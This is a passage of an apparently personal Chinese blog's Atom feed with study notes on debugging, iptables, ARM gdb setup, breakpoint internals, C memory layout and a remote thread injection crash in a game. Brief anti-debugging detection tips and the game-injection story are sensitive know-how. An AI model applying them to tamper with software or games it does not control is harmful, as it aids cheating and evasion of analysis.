      <category term="PowerShell" scheme="http://xwdidi.top/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>双机调试简单问题</title>
    <link href="http://xwdidi.top/2019/08/24/2019-08-24-%20%E5%8F%8C%E5%87%BB%E8%B0%83%E8%AF%95%E7%AE%80%E5%8D%95%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://xwdidi.top/2019/08/24/2019-08-24- 双击调试简单问题总结/</id>
    <published>2019-08-23T16:00:00.000Z</published>
    <updated>2019-11-08T15:50:11.993Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在虚拟机正常安装 VirtualKD, 然后再执行下命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`bcdedit ``/``dbgsettings SERIAL DEBUGPORT:``<span class="number">1</span>` `BAUDRATE:``<span class="number">115200</span>`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="VirtualKD" scheme="http://xwdidi.top/tags/VirtualKD/"/>
    
  </entry>
  
  <entry>
    <title>iptables简单小结</title>
    <link href="http://xwdidi.top/2019/06/18/2019-06-18-iptables%E7%AE%80%E5%8D%95%E5%B0%8F%E7%BB%93/"/>
    <id>http://xwdidi.top/2019/06/18/2019-06-18-iptables简单小结/</id>
    <published>2019-06-18T06:19:36.000Z</published>
    <updated>2019-06-18T15:06:33.244Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h3><p>最近这段时间学校要让我们做一些小实验.</p><p>一个实验就是配置iptables: 1.完全屏蔽外网 2.内网只能向外访问http&amp;https&amp;ftp服务.</p><p>然后我将这个总结于对端口进行数据包过滤就好了,不知道这样对不对希望可以指出我的错误.(图解http没怎么看过..</p><p>这样就简单了,上网学习iptables相关命令编写就完事了,不过相关底层原理感觉蛮有意思的,看的<a href="https://blog.csdn.net/qq_38892883/article/details/79709023" target="_blank" rel="noopener">这篇文章</a></p><p>学习的..</p><p>这是简单的shell脚本,运行就行了.本机环境是<code>ubuntu16.04</code>.采用<code>nc</code>和<code>telnet</code>相互验证端口畅通性.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">iptables.sh</span></span><br><span class="line"></span><br><span class="line">set -v</span><br><span class="line">clear</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ssh</span></span><br><span class="line">iptables -A INPUT  -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">http</span></span><br><span class="line"><span class="meta">#</span><span class="bash">https</span></span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --dport 443 -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -p tcp --sport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ftp</span></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 21 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -P INPUT DROP  </span><br><span class="line">iptables -P FORWARD DROP  </span><br><span class="line">iptables -P OUTPUT DROP </span><br><span class="line"></span><br><span class="line">iptables -L -n --line-number</span><br></pre></td></tr></table></figure><h3 id="读后总结"><a href="#读后总结" class="headerlink" title="读后总结"></a>读后总结</h3><p>当然这些都是看上述文章一些浅显的,借鉴过来的知识.方便自己看hhh</p><h4 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h4><p>ipfirewall-&gt;ipchains-&gt;iptables</p><h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p>通过配置iptables,让内核空间当中的netfilter(网络过滤器)读取配置,并实让现防火墙工作.</p><p>为了实现过滤,要放在内核特定的位置,tcp/ip的协议栈经过的地方(netfilter).</p><p>1.PREROUTING (数据包进入路由前)</p><p>2.INPUT (通过路由表后目的为本机)</p><p>3.FORWARD (通过路由表后,目的地不为本机)</p><p>4.OUTPUT(由本机产生,向外转发)</p><p>5.POSTROUTING（发送到网卡接口之前）</p><p><img src="https://s1.51cto.com/attachment/201304/203657722.png" alt></p><p>现在目前只考虑到filter链上,然后forawrd用作nat转发暂时没有用到,以后可能还会接触到.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Linux" scheme="http://xwdidi.top/categories/Linux/"/>
    
    
      <category term="实验" scheme="http://xwdidi.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>arm环境搭建-gdb调试</title>
    <link href="http://xwdidi.top/2019/05/24/2019-05-24-arm%E7%8E%AF%E5%A2%83gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://xwdidi.top/2019/05/24/2019-05-24-arm环境gdb调试/</id>
    <published>2019-05-24T05:33:23.000Z</published>
    <updated>2019-11-08T15:49:52.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 最近想学习一下arm指令集,恰好手边有一台多余的二手机.从MIUI刷成原生安卓终于能正常<code>adb push</code>了.</p><p>大多数的环境配置与调试是根据这篇文章<a href="http://www.tasfa.cn/index.php/2016/06/01/android-re-gdb/" target="_blank" rel="noopener">Android逆向系列之动态调试(五)–gdb调试</a>进行学习的.</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在这里我做一点补充和效率的提高.</p><ol><li><p>ndk的压缩包从这里<a href="https://developer.android.com/ndk/downloads?hl=zh-CN" target="_blank" rel="noopener">下载</a>.</p></li><li><p>我的压缩包解压后的文件名为<code>android-ndk-r19c</code></p><p>我是小米4的手机.</p></li><li><p>所以使用的gdbserver在<code>\android-ndk-r19c\prebuilt\android-arm\gdbserver</code></p><p>使用的调试编译的可执行文件如as.exe和ld.exe在<code>\android-ndk-r19c\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64\arm-linux-androideabi\bin</code></p><p>gdb.exe在<code>F:\android_ndk\android-ndk-r19c\prebuilt\windows-x86_64\bin</code></p></li><li><p>已经把gdb.exe添加进环境变量中.</p><p>注意和gdb.exe同一个文件夹的python.exe,需要改名.不然会和自己的原来的python产生冲突.()</p></li><li><p>批处理</p></li></ol><p>​    我把调试的文件一律放在了/data/local/tmp/arm_p/中</p><p>​    然后这是自认为提高效率的东西.</p><p>这是文件树</p><p>​    <img src="https://i.loli.net/2019/05/24/5ce80487b3f5f27607.png" alt></p><p>以下是代码.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdbserver.bat</span><br><span class="line"></span><br><span class="line">adb push pra/%1 /data/<span class="built_in">local</span>/tmp/arm_p</span><br><span class="line">adb shell chmod 777 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br><span class="line">adb shell gdbserver :23946 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:: start_gdb.bat</span><br><span class="line"></span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br><span class="line">gdb -x gdb_script</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdb_script</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> disassemble-next on</span><br><span class="line"><span class="built_in">set</span> step-mode on</span><br><span class="line">target remote 127.0.0.1:23946</span><br></pre></td></tr></table></figure><p>gdbserver.bat  上传文件,启动服务监听</p><p>start_gdb.bat  反汇编,单步调试</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://xwdidi.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="arm" scheme="http://xwdidi.top/tags/arm/"/>
    
      <category term="gdb" scheme="http://xwdidi.top/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>断点原理</title>
    <link href="http://xwdidi.top/2019/04/07/2019-04-07-%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/"/>
    <id>http://xwdidi.top/2019/04/07/2019-04-07-断点原理/</id>
    <published>2019-04-07T05:33:23.000Z</published>
    <updated>2019-11-08T15:48:47.980Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="CC断点"><a href="#CC断点" class="headerlink" title="CC断点"></a>CC断点</h3><p>F2断点.\</p><p>设置无数个.</p><p>将断下的指令地址处的第一个字节设置为0xCC</p><p>0xCC对应<code>int3</code>,专门用来调试的中断指令.</p><p>触发EXCEPTION_BREAKPOINT的异常,进行相应的处理</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>检测首地址是否为CCH</p><h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>或者是<code>PAGE_GUARD</code></p><blockquote><p>A: 内存访问断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_NOACCESS，当被调试程序对这个内存进行任何“读、写或运行”操作时，都会触发异常。</p><p>B: 内存写入断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_EXECUTE_READ，当被调试程序对这个内存进行“写”操作时触发异常。</p></blockquote><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>我们使用VirtualProtectEx进行内存页修改,通过GetLastError获取到的值进行判断,进行相关处理</p><h4 id="反反内存断点"><a href="#反反内存断点" class="headerlink" title="反反内存断点"></a>反反内存断点</h4><p>VirtualQuery，VirtualQueryEx，VirtualProtect，VirtualProtectEx</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>利用CPU自带的调试寄存器DR0-DR3设置硬件断点,产生SINGLE_STEP异常.</p><p>四个寄存器 最多四个断点.</p><p>DR7是控制位,控制断点方式.DR6显示断点原因</p><p><strong><a href="https://www.pediy.com/kssd/pediy06/pediy6751.htm" target="_blank" rel="noopener">学习大佬的文章</a></strong></p><h3 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h3><ul><li><ol><li>通过调试符号获取当前对应的行信息, 并保存该信息.</li><li>设置TF位, 开始CPU的单步执行,产生调试异常(int 1),中断到调试器</li><li>处理单步执行异常程序,TF置为0 </li></ol></li><li><p>执行源码调试,通过多次汇编一级的单步执行实现</p><p>通过符号文件判断是否为当行源码,若是的话,立即设置单步执行标志位继续执行,.直到ip不为当行源码.</p></li></ul><ul><li><p>程序分支</p><p>DbgCtl MSR寄存器的BTF标志,再设置TF.则可以执行到下一个分支指令触发调试异常</p></li></ul><ul><li><p>当指定任务被调度执行到中断调试器时. IA32CPU切换到一个新的任务时,检查存在于GDT中的TSS描述符的T标志位,若为1,啧产生调试异常</p><p>  TSS任务状态段</p><p>  <img src="https://i.loli.net/2019/04/11/5caf398fae53c.png" alt="TSS"></p><p>  切换进程更新动态字段:</p><ol><li>通用寄存器字段—任务切换之前，EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI寄存器状态。 </li><li>段选择符字段—任务切换之前，ES,CS,SS,DS,FS,GS寄存器保存的段选择符。 </li><li>EFLAGS寄存器字段—任务切换之前，EFAGS寄存器的状态。</li><li>EIP字段—任务切换之前，EIP寄存器的状态。</li><li>先前任务链接字段—包含先前任务的TSS的段选择符。该字段禁止任务通过使用IRET指令返回先前的任务。 </li></ol></li></ul><p>​     </p><p>​     </p><pre><code>等读完张银奎老师的软件调试再来做细致修改和改正    </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向基础" scheme="http://xwdidi.top/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="断点" scheme="http://xwdidi.top/tags/%E6%96%AD%E7%82%B9/"/>
    
      <category term="调试" scheme="http://xwdidi.top/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>VC：执行远程线程注入的代码段导致目标进程崩溃</title>
    <link href="http://xwdidi.top/2019/04/01/2019-04-01-VC%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%A4%B1%E8%B4%A5/"/>
    <id>http://xwdidi.top/2019/04/01/2019-04-01-VC线程注入失败/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-11-08T15:50:43.123Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天使用植物大战僵尸练习线程注入调用call的时候,一直处于崩溃状态,,后来查阅了教程博客,下面有人指出了问题所在 在此引用下老哥的博客文章.</p><p><a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">原文地址</a></p><blockquote><p>以前也曾多次提到远程线程注入导致进程崩溃的现象。</p><p>此次崩溃不同于前几次。</p><p>之前，采用的是dll注入的方式，注入后，由于同一个dll文件在不同的进程中映射的基地址不同，导致远程线程函数的入口地址不同，以至崩溃，这种情况，多数是本进程采用静态链接加载待远程注入的dll文件，而其他进程则动态加载该dll文件，两次加载将在内存中产生两个dll实例。</p><p>此次，需要向远程进程注入代码段，远程线程函数入口地址正确。测试时，为了方便，特地增加了一个消息框MessageBox，远程线程函数仅仅调用这个弹出消息框的函数，然后退出。结果，消息框正常弹出，但是，当点击确定退出消息框后，目标进程立即崩溃。原因不明。</p><p>200807210756注：</p><p>实在不知道问题出哪儿了，于是就想看看注入的VC代码对应的反汇编代码，这时，忽然想到一点，即：我都是在Debug模式下执行的，这可能会有问题。</p><p>进一步思考。Debug版本和Release版本最大的不同在于，每次调用一个函数后，Debug版本会进行堆栈检测。而目标进程显然是处于release模式，此时，如果注入的是Debug版本的代码，那么，调用函数之后，会有一句检测堆栈的机器指令，这很可能就是进程崩溃的原因所在。</p><p>于是，改为release环境测试，一切正常！OK！</p><p>(我用控制台程序实现时没有问题，用MFC程序实现就有问题，因此发现以上内容，将Debug版改为Release版就没问题了)</p><p>另附上远程注入的主要代码段，供参考，有问题望指教！！！</p><p>作者：kk20078733<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/kk20078733/article/details/5530884" target="_blank" rel="noopener">https://blog.csdn.net/kk20078733/article/details/5530884</a> </p></blockquote><p>Debug版会使用一个检查堆栈平衡的函数_checkesp..</p><p>详细的在小黄书中有讲到.现在记得不是很清楚.</p><p>有机会的话会写上来.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="错误整理" scheme="http://xwdidi.top/categories/%E9%94%99%E8%AF%AF%E6%95%B4%E7%90%86/"/>
    
    
      <category term="植物大战僵尸" scheme="http://xwdidi.top/tags/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8/"/>
    
  </entry>
  
  <entry>
    <title>语言复习       查漏补缺 不定时更新</title>
    <link href="http://xwdidi.top/2019/03/15/2019-03-13-%E8%AF%AD%E8%A8%80%E8%A6%81%E7%82%B9%E5%A4%8D%E4%B9%A0/"/>
    <id>http://xwdidi.top/2019/03/15/2019-03-13-语言要点复习/</id>
    <published>2019-03-14T16:00:00.000Z</published>
    <updated>2019-04-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="语言要点复习"><a href="#语言要点复习" class="headerlink" title="语言要点复习"></a>语言要点复习</h1><h3 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h3><h4 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h4><p> (block started by symbol segmengt) 符号段块的起始位置</p><p>只存在于运行在内存中的可执行文件中.保存程序的起始地址和结束地址.不存在于硬盘的二进制文件中</p><p>因为一般用来存放未初始化的全局变量和静态变量,在程序之行开始时,这段区域的未初始化的都会被初始化为0,</p><p>以便内存区能在运行时分配并被有效地清零.不同架构可能有不同的方法.</p><p>.bss段从可执行文件中得到,链接器得到这个段大小的内存块,紧跟在数据段之后.</p><h4 id="data-段"><a href="#data-段" class="headerlink" title=".data 段"></a>.data 段</h4><p>data segment数据段,存放初始化好的全局变量,静态变量.</p><p>这个位置通常属于只读的.静态常量区.</p><p><code>char *a = &quot;Windows&quot;</code>,这个Windows字符串属于.data段,只读属性.如果运行<code>*a = &#39;a&#39;</code>会造成访问冲突.</p><p>大小在编译链接时自动分配.和全局变量,静态变量,常量有关</p><h3 id="rdata段"><a href="#rdata段" class="headerlink" title=".rdata段"></a>.rdata段</h3><p>包含导入和导出的导出函数信息,还可以存储程序御用的其他只读数据.</p><p>有些文件会包含.idata和.edata用来存储导入导出信息.</p><h3 id="pdata-段"><a href="#pdata-段" class="headerlink" title=".pdata 段"></a>.pdata 段</h3><p>只存在于64位pe文件中,存储异常信息</p><p>.bss+.data=静态存储区.存放静态变量 全局变量 常量(常变量,字符串常量)已经初始化,不可被修改</p><p>局部变量通过指针,引用访问和修改.</p><p>全局变量在静态存储区不可以被间接修改.</p><h4 id="text-段-code段"><a href="#text-段-code段" class="headerlink" title=".text 段 .code段"></a>.text 段 .code段</h4><p>VS中叫.text</p><p>borland的delphi使用.code</p><p>程序代码段, 存放二进制代码,编译后是静态不可变的.</p><p>为什么要设置这个段呢.程序语言文本是只读的,数据不是.每次加载代码,会固定加载到内存中.减少内存的使用,增加的内存的复用.</p><h4 id="stack-栈"><a href="#stack-栈" class="headerlink" title="stack 栈"></a>stack 栈</h4><p>堆栈,存放局部变量的区域,使用<code>push</code>指令压栈.调用函数执行<code>call</code>前,参数压栈,函数返回结果也会压栈放回.</p><p>VS默认栈为1M,64bits的linux栈默认10mb.</p><h4 id="heap-堆"><a href="#heap-堆" class="headerlink" title="heap 堆"></a>heap 堆</h4><p>FIFO的数据结构.用来保障函数内存分布.</p><p>malloc new 申请</p><p>free delete 删除对重指定信息</p><p>malloc 放回void* ,new返回类型指针,并执行构造函数</p><h3 id="rsrc"><a href="#rsrc" class="headerlink" title=".rsrc"></a>.rsrc</h3><p>包含可执行文件所使用的资源.图标\图片\菜单项\字符串</p><p>在.rsrc中经常存储的字符串,是为了提供多语种的支持.</p><h3 id="reloc"><a href="#reloc" class="headerlink" title=".reloc"></a>.reloc</h3><p>包含重定位库文件的信息</p><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>存储在静态存储区,在整个程序运行期间一直占据这些空间. 内存地址是不变的.不过不能在作用域外使用.</p><p>所有全局变量都是静态变量,而局部变量只有定义时加上static修饰符,才能成为局部静态变量.</p><p>不会随着函数的启动和结束而消失.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> str[] = <span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strA</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str* = <span class="string">"hello"</span>;<span class="comment">//字符串位于常量区,处于静态存储区.生命周期内恒定不变的.无法被改变</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><p><code>int c[2][3]</code> 表示数组c有两组3个数字的数组.</p><p><code>c</code>表示数组首地址 表示的是二维数组行指针</p><p><code>*c</code>第一行元素的首地址,是一维指针,是二维数组的列指针.</p><p><code>**c</code>取第一个元素的值.</p><p><code>char (*str)[20]</code>数组指针.执行数组元素的指针</p><p><code>char *str[20]</code>指针数组,数组成员为<code>char *</code>指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> *p=arr;<span class="comment">//首个元素的首地址</span></span><br><span class="line">    </span><br><span class="line">    *(p++)+=<span class="number">123</span>;<span class="comment">//计算完成后 指向第二个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d\n"</span>, *p,*(++p)); <span class="comment">//参数从左往右看,此时p指向第三个元素</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是没有返回值,没有参数的函数</p><p><code>void f(void)</code></p><p>这是一个指向函数的指针,该函数没有返回值和参数</p><p><code>void(*p)(void)</code></p><p>上述指针的类型</p><p><code>void (*)(void)</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))</code></p><p>对该类型的强制转换</p><p><code>(void (*)(void))0</code></p><h4 id="让程序跳转到绝对地址是0x100000去执行"><a href="#让程序跳转到绝对地址是0x100000去执行" class="headerlink" title="让程序跳转到绝对地址是0x100000去执行"></a>让程序跳转到绝对地址是0x100000去执行</h4><p><code>((void (*)())0x100000)()</code></p><h3 id="const-static"><a href="#const-static" class="headerlink" title="const static"></a>const static</h3><h4 id="先说const"><a href="#先说const" class="headerlink" title="先说const"></a>先说const</h4><p>const 是表示常量的标识符.</p><p>const char * A  A指针指向的变量是不可变的</p><p>char const *A    和上述一样</p><p>char *const A    指针本身是不可变的,所以必须被初始化.而变量可以改变</p><h4 id="static-标识符"><a href="#static-标识符" class="headerlink" title="static 标识符"></a>static 标识符</h4><ul><li><p>如果在全局变量加上static,被限定了作用域,只能在该源文件中使用.从而保证了在其他源文件中不被使用.只被初始化一次.</p><p>改变了作用域和使用范围</p></li><li><p>给局部变量加上的static的话,在局部函数结束后不会消失,且是最新的状态.</p><p>只被初始化一次</p><p>(编译器在该目标编译单元内只有该函数的入口地址,没有函数名,其他编译单元不能通过函数名调用该函数,)</p><p>随着程序结束而消失</p></li><li><p>static函数在内存中只存在一份,普通函数存在复数拷贝</p></li><li><p>类的成员函数中加上,该类的对象同时共用这一个成员函数,成员变量也是.</p></li></ul><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p>多态:<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E7%89%A9%E4%BB%B6%E5%B0%8E%E5%90%91%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88" target="_blank" rel="noopener">多态</a>)（Polymorphism）是指由继承而产生的相关的不同的类，其对象对同一消息会做出不同的响应<a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1#cite_note-8" target="_blank" rel="noopener">[8]</a></p><p><a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1</a></p><p>很有意思的讲解</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="逆向基础" scheme="http://xwdidi.top/categories/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="复习" scheme="http://xwdidi.top/tags/%E5%A4%8D%E4%B9%A0/"/>
    
      <category term="基础" scheme="http://xwdidi.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>DuiLib环境搭建</title>
    <link href="http://xwdidi.top/2018/11/05/2018-11-05-DuiLib%E6%90%AD%E5%BB%BA/"/>
    <id>http://xwdidi.top/2018/11/05/2018-11-05-DuiLib搭建/</id>
    <published>2018-11-04T16:00:00.000Z</published>
    <updated>2019-11-08T15:49:32.522Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天弄了一天环境,终于编译成功了.如果这篇文章有幸被看到,希望能帮助你少走弯路.</p><ol><li>克隆DuiLib库<code>git clone https://github.com/duilib/duilib.git</code>,duilib中有个大写的DuiLib文件夹,这是我们需要编译的库.</li><li>在VS2015中,创建示例程序是从win32-&gt;win32项目创建的.</li><li>参考DuiLib的<a href="https://github.com/duilib/duilib/wiki/%E6%AD%A3%E7%A1%AE%E7%BC%96%E8%AF%91-Duilib-%E9%9D%99%E6%80%81%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">wiki</a>,比较重要的是lib的引用:附加依赖项,附加包含目录,附加库目录.</li><li>如果采用的是文件的xml格式的话,一定要将xml与exe同一父目录下,不然会出现编译成功,却DuiLib加载资源失败的提示哦.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
